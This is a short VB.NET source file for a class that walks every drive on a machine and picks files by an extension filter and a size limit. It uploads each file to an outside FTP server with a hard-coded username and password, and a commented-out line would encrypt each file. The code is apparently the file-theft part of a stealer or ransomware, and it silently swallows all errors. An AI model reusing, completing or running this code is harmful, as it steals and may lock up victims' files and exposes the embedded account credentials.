#Region "Imports"

Imports System.IO
Imports System.IO.Directory

#End Region

Public Class clsSearch

#Region "Functions"

    Private Shared Function CheckExtension(ByVal sPath As String, ByVal sExtFilter() As String) As Boolean
        For Each ext In sExtFilter
            If sPath.EndsWith(ext) Then Return True : Exit Function
        Next
        Return False
    End Function

    Private Shared Function IsExcludedFolder(ByVal sFolderPath As String, ByVal sFolder() As String) As Boolean
        On Error Resume Next
        For i = 0 To UBound(sFolder)
            If InStr(LCase(sFolderPath), LCase(sFolder(i))) <> 0 Then Return True : Exit Function
        Next
        Return False
    End Function

#End Region

#Region "Procedures"

    Public Shared Sub ScanDrives()
        Try
            For Each sDrives In Directory.GetLogicalDrives()
                ScanDirectories(sDrives)
            Next
        Catch uaEx As UnauthorizedAccessException
        End Try
    End Sub

    Private Shared Sub ScanDirectories(ByVal sRootDirectory As String)
        Dim FolderStack As New Stack(Of String)
        FolderStack.Push(sRootDirectory)
        Do While FolderStack.Count > 0
            Dim ThisFolder As String = FolderStack.Pop
            Try
                If Not IsExcludedFolder(ThisFolder, clsS.sExcludedFolders) Then
                    For Each SubFolder In GetDirectories(ThisFolder)
                        FolderStack.Push(SubFolder)
                    Next
                    ScanFiles(ThisFolder)
                End If
            Catch ex As Exception
            End Try
        Loop
    End Sub

    Private Shared Sub ScanFiles(ByVal sSubDirectory As String)
        Try
            For Each sfile In GetFiles(sSubDirectory)
                If CheckExtension(sfile, clsS.sExtensionFilter) Then
                    If CheckFileSize(sfile) < clsS.MAX_FILE_SIZE Then
                        Try
                            clsFTP.UploadFile(sfile, "ftp://ftp.securebytes.com.co", "diegojojoa@securebytes.com.co", "$%8387Jojoa")
                            'clsCrypto.Encrypt(sfile, clsS.bytPK, clsS.bytSK)
                        Catch exUnathorized As UnauthorizedAccessException

                        End Try
                    End If
                End If
            Next
        Catch ex As Exception
        End Try
    End Sub

#End Region

End Class
